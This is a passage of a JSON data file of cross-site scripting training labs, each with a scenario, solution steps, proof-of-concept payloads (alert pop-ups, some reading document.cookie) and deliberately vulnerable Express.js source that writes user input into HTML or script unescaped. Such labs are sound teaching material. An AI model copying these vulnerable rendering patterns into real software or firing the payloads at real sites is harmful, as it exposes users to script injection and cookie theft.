      "Inspect tooltip behavior using developer tools (DOM/JS console).",
      "Confirm use of innerHTML and identify injection point.",
      "Craft payloads that fit inside tooltip container.",
      "Confirm that the payload executes on page load or interaction."
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>",
      "<script>alert(document.cookie)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const term = req.query.term || ''; res.send(`<html><body><div id='tooltip'></div><script>document.getElementById('tooltip').innerHTML = '${term}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Feedback Form Subject",
    "Lab Description": "The feedback page echoes the submitted subject value back in a confirmation message. It does so by embedding the subject value directly into HTML without escaping. To solve: Inject a payload in the subject input to execute code when the confirmation is rendered.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access /feedback and fill in the subject field with a payload.",
      "Submit the form and observe confirmation message.",
      "Inspect the rendering and check where subject appears.",
      "Craft a working script-injection payload.",
      "Confirm alert triggers after form submission."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/feedback', (req, res) => { res.send(`<form method='POST'><input name='subject'><button>Send</button></form>`); }); app.post('/feedback', (req, res) => { const subject = req.body.subject; res.send(`<p>Thanks for your feedback on: ${subject}</p>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Forum Post Title",
    "Lab Description": "A forum allows users to post discussion threads. The thread titles are stored and displayed in a list on the homepage. Titles are rendered into the DOM without sanitization. To solve: Submit a new post with an XSS payload in the title and verify that it executes on homepage load.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to /new-thread and submit a title with an XSS payload.",
      "Visit /forum to view all posts.",
      "Inspect rendering of the title in list view.",
      "Try multiple HTML-based payloads.",
      "Verify payload executes on page load."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const posts = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/new-thread', (req, res) => { res.send(`<form method='POST'><input name='title'><button>Create</button></form>`); }); app.post('/new-thread', (req, res) => { posts.push(req.body.title); res.redirect('/forum'); }); app.get('/forum', (req, res) => { const items = posts.map(p => `<li>${p}</li>`).join(''); res.send(`<ul>${items}</ul>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "XSS in Profile Badge Generator",
    "Lab Description": "The application lets users generate HTML badges for embedding in external blogs. The badge content includes user-provided name and is rendered with innerHTML. To solve: Inject a payload in the name and view the generated badge HTML to trigger execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to /badge and enter a malicious name.",
      "Submit the form to get HTML code preview.",
      "Inspect generated HTML using browser dev tools.",
      "Check for unsanitized rendering via innerHTML.",
      "Confirm execution of injected payload."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('Badge')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.get('/badge', (req, res) => { res.send(`<form method='POST'><input name='username'><button>Generate</button></form>`); }); app.post('/badge', (req, res) => { const name = req.body.username; res.send(`<div>Your badge:</div><div><code>&lt;div&gt;User: ${name}&lt;/div&gt;</code></div>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS in Hash-Based Routing",
    "Lab Description": "A single-page application reads the hash part of the URL to render navigation state. It updates the DOM using `document.getElementById('view').innerHTML = location.hash`. This leads to DOM-based XSS if the hash includes script or dangerous HTML. To solve: Inject a payload in the URL hash to trigger execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit the application at /#payload to test injection.",
      "Inspect JavaScript that updates the DOM with location.hash.",
      "Use the browser console to confirm how the hash is handled.",
      "Inject payloads like <img> or <script> into the hash.",
      "Verify payload is interpreted and executed by the browser."
    ],
    "payloads": [
      "#<img src=x onerror=alert(1)>",
      "#<svg/onload=alert('XSS')>",
      "#<script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send(`<html><body><div id='view'></div><script>document.getElementById('view').innerHTML = location.hash.substring(1);</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Task Manager Note Field",
    "Lab Description": "The task manager app allows users to add notes to tasks. These notes are stored and later displayed without sanitization in the task detail page using innerHTML. The application directly injects note content into a div. To solve: Inject a script payload into the note field and view the task to trigger execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /task/new and create a task with a malicious note.",
      "Submit a payload in the note field.",
      "Visit /task/view to see task details.",
      "Inspect the DOM for unsafe injection.",
      "Confirm payload executes on task view."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tasks = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/task/new', (req, res) => { res.send(`<form method='POST'><input name='note'><button>Create Task</button></form>`); }); app.post('/task/new', (req, res) => { tasks.push(req.body.note); res.redirect('/task/view'); }); app.get('/task/view', (req, res) => { const taskNotes = tasks.map(n => `<div>${n}</div>`).join(''); res.send(`<html><body>${taskNotes}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS in Email Preview Feature",
    "Lab Description": "An email client renders previews of received emails by injecting subject lines using innerHTML. If the subject includes HTML tags, they are interpreted without sanitization. To solve: Inject a payload into the subject query parameter and confirm execution in the preview.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access /email/preview?subject= and test with basic HTML.",
      "Inspect the preview rendering logic in DOM.",
      "Identify lack of escaping in innerHTML usage.",
      "Inject payloads with <img> or <svg>.",
      "Confirm execution when preview is rendered."
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<script>alert(document.domain)</script>",
      "<svg/onload=alert('EmailXSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/email/preview', (req, res) => { const subject = req.query.subject || ''; res.send(`<html><body><div id='subject'></div><script>document.getElementById('subject').innerHTML = '${subject}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Product Search Filter",
    "Lab Description": "The product search page reflects the `category` parameter in a JavaScript variable to customize the UI. The category value is embedded in a script tag via template literal. To solve: Inject a payload that escapes the JS context and triggers script execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to /products?category= and test reflection.",
      "Inspect source for how category is used.",
      "Confirm value is injected in a JS block.",
      "Craft payloads using backticks or quotes.",
      "Verify that payload executes in JS context."
    ],
    "payloads": [
      "`;alert('XSS')//",
      "';alert(1);//",
      "\";alert(document.cookie);//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/products', (req, res) => { const category = req.query.category || 'all'; res.send('<html><head><script>var cat = \"' + category + '\";</script></head><body><h2>Category: ' + category + '</h2></body></html>'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Commenting System",
    "Lab Description": "A commenting system allows users to post comments, which are displayed below blog posts. The content is rendered without sanitization using raw HTML. To solve: Submit a comment with an XSS payload and revisit the blog to observe execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to /blog/1 and post a comment with an XSS payload.",
      "Submit the form and reload the blog page.",
      "Inspect the comment rendering in DOM.",
      "Confirm raw HTML is rendered directly.",
      "Verify that the payload executes when comment is displayed."
    ],
    "payloads": [
      "<script>alert('Comment XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<iframe src=javascript:alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/blog/1', (req, res) => { const commentList = comments.map(c => `<p>${c}</p>`).join(''); res.send(`<form method='POST'><input name='comment'><button>Submit</button></form>${commentList}`); }); app.post('/blog/1', (req, res) => { comments.push(req.body.comment); res.redirect('/blog/1'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS via Location Hash in Navigation Tab",
    "Lab Description": "The app reads the URL hash and uses it to dynamically highlight a tab in the navigation bar. The tab name is inserted into the DOM using innerHTML without validation. To solve: Inject a malicious payload in the hash to trigger script execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit the application with a crafted hash payload.",
      "Observe how location.hash is handled in script.",
      "Use browser tools to confirm DOM insertion method.",
      "Craft payloads compatible with innerHTML.",
      "Confirm alert triggers from hash injection."
    ],
    "payloads": [
      "#<img src=x onerror=alert(1)>",
      "#<svg/onload=alert('HashXSS')>",
      "#<script>alert('Hash')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/', (req, res) => { res.send(`<html><body><div id='nav'></div><script>document.getElementById('nav').innerHTML = location.hash.substring(1);</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in User Bio Field on Profile Page",
    "Lab Description": "A user profile page displays the bio field submitted during registration. The content is rendered with innerHTML when another user views the profile. The application stores and reflects this bio without escaping. To solve: Submit a script payload in the bio and visit the profile to trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register a new user with an XSS payload in the bio.",
      "Log in and navigate to your profile to confirm injection.",
      "View your profile as another user.",
      "Inspect DOM rendering of bio using innerHTML.",
      "Verify that the payload executes."
    ],
    "payloads": [
      "<script>alert('BioXSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); const users = {}; app.use(session({ secret: 'x', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); app.get('/register', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"bio\"><button>Register</button></form>'); }); app.post('/register', (req, res) => { users[req.body.username] = { bio: req.body.bio }; req.session.user = req.body.username; res.redirect('/profile'); }); app.get('/profile', (req, res) => { const user = users[req.session.user]; res.send('<div id=\"bio\"></div><script>document.getElementById(\"bio\").innerHTML = `' + user.bio + '`;</script>'); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS via Search Input Reflection in Script Block",
    "Lab Description": "The search input reflects the user query in a JavaScript variable using template literals. This is vulnerable because the search query is not escaped before being included in a script tag. To solve: Inject a payload that breaks out of the JS context and executes code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a search request using the `q` parameter.",
      "Inspect source code to see query reflected in JS.",
      "Craft payload with `\"` or backticks to break context.",
      "Trigger payload by visiting crafted URL.",
      "Confirm alert triggers from the JS block."
    ],
    "payloads": [
      "\";alert('XSS')//",
      "`;alert(document.cookie)//",
      "';alert('Injected')//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/search', (req, res) => { const q = req.query.q || ''; res.send(`<html><body><script>var searchTerm = \"${q}\";</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in Error Message of Password Reset",
    "Lab Description": "The password reset feature reflects the email query parameter in an error message when an invalid email is submitted. The message is rendered via innerHTML in the frontend. To solve: Inject a script in the email parameter and submit it to trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a password reset request with a crafted email.",
      "Inspect the resulting error message in DOM.",
      "Identify lack of escaping when rendering the message.",
      "Inject payload using <img> or <svg>.",
      "Confirm execution of the XSS payload."
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert('XSS')</script>",
      "<svg/onload=alert('resetXSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/reset', (req, res) => { const email = req.query.email || ''; res.send(`<html><body><div id='msg'></div><script>document.getElementById('msg').innerHTML = 'No account for ${email}';</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Stored XSS in Feedback Message Panel",
    "Lab Description": "The application allows users to submit feedback that is stored and shown to admins in a panel. The feedback is rendered with raw HTML inside a review box. To solve: Submit a payload as feedback and access the admin panel to trigger XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to /feedback and submit XSS payload.",
      "Access /admin/feedback to view stored feedback.",
      "Confirm payload is rendered using innerHTML.",
      "Trigger XSS by loading the admin panel.",
      "Verify alert or script execution occurs."
    ],
    "payloads": [
      "<script>alert('AdminXSS')</script>",
      "<img src=x onerror=alert('StoredXSS')>",
      "<iframe src=javascript:alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.get('/feedback', (req, res) => { res.send(`<form method='POST'><input name='msg'><button>Send</button></form>`); }); app.post('/feedback', (req, res) => { feedback.push(req.body.msg); res.redirect('/'); }); app.get('/admin/feedback', (req, res) => { const panel = feedback.map(f => `<div>${f}</div>`).join(''); res.send(`<html><body>${panel}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "DOM XSS in Real-Time Chat Name Binding",
    "Lab Description": "The chat app sets a user's name via a query parameter and reflects it in a greeting using innerHTML. If the name contains HTML or scripts, they are rendered without sanitization. To solve: Inject a script in the name parameter to execute code on page load.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Join chat using /chat?name= and observe greeting.",
      "Inspect DOM to confirm innerHTML usage.",
      "Craft payload with <svg> or <img>.",
      "Trigger payload by visiting the crafted URL.",
      "Verify execution of alert or injected code."
    ],
    "payloads": [
      "<svg/onload=alert('ChatXSS')>",
      "<img src=x onerror=alert('Injected')>",
      "<script>alert(document.cookie)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/chat', (req, res) => { const name = req.query.name || 'Guest'; res.send(`<html><body><div id='welcome'></div><script>document.getElementById('welcome').innerHTML = 'Hello, ${name}!';</script></body></html>`); }); app.listen(3000);"
  }
]